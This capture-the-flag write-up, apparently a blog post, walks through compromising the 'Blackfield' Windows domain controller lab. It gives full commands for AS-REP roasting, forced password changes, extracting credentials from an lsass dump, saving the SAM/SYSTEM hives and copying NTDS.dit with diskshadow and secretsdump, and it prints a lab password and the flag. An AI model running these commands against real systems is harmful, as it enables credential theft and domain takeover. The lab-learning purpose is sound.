---
layout: post
title: "Blackfield"
date: 2026-02-04 10:00:00
categories: writeups
tags: [Windows, ASREPRoasting, ForceChangePassword_abuse, SeBackupPrivilege_abuse_(diskshadow)]
lang: en
image: /assets/images/blackfield/blackfield-box.webp
---

# Concepts covered in the machine
```
- Share enumeration without authentication
- Enumeration of valid domain users
- ASREPRoasting and hash cracking
- Abuse of the ForceChangePassword permission
- Enumerating shares again to find an lsass minidump to extract a user hash
- Abuse of SeBackupPrivilege to perform a diskshadow attack and obtain the admin hash
```

# Enumeration & Initial Foothold

>??IP
>```
>10.129.229.17
>```
>*Operating System*: Windows

>?? Users:Passwords
```
support:#00^BlackKnight
```

>?? Domains
>```
>blackfield.local
>```

## ?? Nmap scan

```python
nmap -p- --open -sS --min-rate 3000 -vvv -n -Pn 10.129.229.17 -oG allPorts
```

```
nmap --top-ports=300 -sU -vvv -oG UDP_Ports 10.129.229.17
```

```
nmap -p -sCV -vvv -oN targeted 10.129.229.17  
```

```python
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-05 00:18:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2026-02-05T00:18:48
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

From the nmap capture, we observe the machine's FQDN, which is `blackfield.local`, so we add it to /etc/hosts, additionally, the presence of ports 53 (DNS) and 88 (Kerberos) suggests it could be a Domain Controller (DC)

## 53 - DNS

We try launching different DNS queries with the goal of finding some more subdomains

![]({{ "/assets/images/blackfield/Pasted image 20260204182526.webp" | relative_url }})

We extract information about the dc's domain, which is `dc01.blackfield.local`, we add it to /etc/hosts as well

## 135 - RPC

Without credentials we can't enumerate anything, so we'll wait until we have credentials

## 445 - SMB

We observe that we can enumerate the shares anonymously without providing credentials and we see interesting folders

```
nxc smb 10.129.229.17 -u 'guest' -p ''  --shares
```

![]({{ "/assets/images/blackfield/Pasted image 20260204182910.webp" | relative_url }})

We have read permissions on the `profiles$` folder, so we access it to see what's inside

```
smbclient -U "blackfield.local\guest" '//10.129.229.17/profiles$'
```

![]({{ "/assets/images/blackfield/Pasted image 20260204183223.webp" | relative_url }})

We observe a lot of empty folders, but they look like usernames, we're going to check if they are valid domain users, we save them into a file and convert them to lowercase

```
kerbrute userenum -d blackfield.local --dc 10.129.229.17 users_clean.txt
```

![]({{ "/assets/images/blackfield/Pasted image 20260204183948.webp" | relative_url }})

We find 3 valid users in the domain, we store them in a file and we'll see if any of them is kerberoastable

```
GetNPUsers.py blackfield.local/ -usersfile valid_users.txt -dc-ip 10.129.229.17 -request -format hashcat
```

![]({{ "/assets/images/blackfield/Pasted image 20260204192958.webp" | relative_url }})

We find a kerberoastable hash, we try to crack it with hashcat

![]({{ "/assets/images/blackfield/Pasted image 20260204193326.webp" | relative_url }})

We have a user, we're going to validate that they are valid in the domain

```
support:#00^BlackKnight
```

![]({{ "/assets/images/blackfield/Pasted image 20260204193813.webp" | relative_url }})

## 389 -  LDAP

With valid domain credentials, we're going to enumerate the AD with rusthound to see what we can do with this user

```
rusthound --domain blackfield.local -u 'support@blackfield.local' -p '#00^BlackKnight' -z
```

![]({{ "/assets/images/blackfield/Pasted image 20260204194151.webp" | relative_url }})

We import the ZIP into bloodhound and see that it has a permission over the `audit2020` user to force a password change

![]({{ "/assets/images/blackfield/Pasted image 20260204194549.webp" | relative_url }})

We change the password of the `audit2020` user and see what we can do as this user

```
net rpc password "audit2020" "Pwned123!" -U "blackfield.local"/"support"%'#00^BlackKnight' -S 10.129.229.17
```

We check that the password has been changed correctly, and we see that we now have read permissions over the `forensic` share, we access it to see what it has

![]({{ "/assets/images/blackfield/Pasted image 20260204194751.webp" | relative_url }})

```
smbclient -U "blackfield.local\audit2020" '//10.129.229.17/forensic'
```

![]({{ "/assets/images/blackfield/Pasted image 20260204195239.webp" | relative_url }})

We enumerate the folders more thoroughly, inside one of them, we see there is a ZIP that catches our attention

![]({{ "/assets/images/blackfield/Pasted image 20260204195746.webp" | relative_url }})

We download everything anyway, and unzip lsass.zip to see if with luck there's some credential in there, we download `pypykatz` and open the minidump as follows

```
pypykatz lsa minidump lsass.DMP
```

We observe hashes for quite a few users, after trying the administrator one, which didn't work, we try the `svc_backup` one which turns out to be a privileged object in the domain, and additionally, has `Remote Desktop Management` permissions

![]({{ "/assets/images/blackfield/Pasted image 20260204200414.webp" | relative_url }})

We try to authenticate with evil-winrm and it seems the hash works, we can retrieve the first flag.

![]({{ "/assets/images/blackfield/Pasted image 20260204200436.webp" | relative_url }})


# Privesc

We see that this user is a member of the `Backup Operators` group

![]({{ "/assets/images/blackfield/Pasted image 20260204200549.webp" | relative_url }})

This privilege is a bit risky, since it allows us to make copies of any file, including the SAM and SYSTEM, so we make them and send them to our machine to, using pypykatz, extract the hashes and be able to log in as administrators

```
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system

pypykatz registry --sam bounty/sam bounty/system
```

![]({{ "/assets/images/blackfield/Pasted image 20260204201715.webp" | relative_url }})

However, this doesn't help us, because they are local hashes, for that, we have to perform a `diskshadow` attack where we create an exact copy of the entire C drive on a made-up one, called Z, and there the files won't be locked, for that, we run these commands

```powershell
$content = "set context persistent nowriters`r`nadd volume c: alias shad`r`ncreate`r`nexpose %shad% z:`r`n"
[System.IO.File]::WriteAllText("C:\Windows\Temp\diskshadow.txt", $content, [System.Text.Encoding]::ASCII)
```

Now, we create it using the diskshadow command

```
diskshadow /s C:\Windows\Temp\diskshadow.txt
```

![]({{ "/assets/images/blackfield/Pasted image 20260204203043.webp" | relative_url }})

At this point, we simply have to copy the files we need, which are NTDS.dit and SYSTEM to carry out the end of the machine, with robocopy we copy the NTDS.dit from the Z drive we just created

```
robocopy /b z:\windows\ntds\ C:\Temp\ ntds.dit
```

![]({{ "/assets/images/blackfield/Pasted image 20260204203311.webp" | relative_url }})

Now, with secretsdump we extract the hashes

```
secretsdump.py -ntds ntds.dit -system system local
```

![]({{ "/assets/images/blackfield/Pasted image 20260204203502.webp" | relative_url }})

We try to connect to the machine with this hash as Administrator, and we can get in

![]({{ "/assets/images/blackfield/Pasted image 20260204203542.webp" | relative_url }})

We're going to read the flag

![]({{ "/assets/images/blackfield/Pasted image 20260204203641.webp" | relative_url }})

```
4375a629c7c67c8e29db269060c955cb
```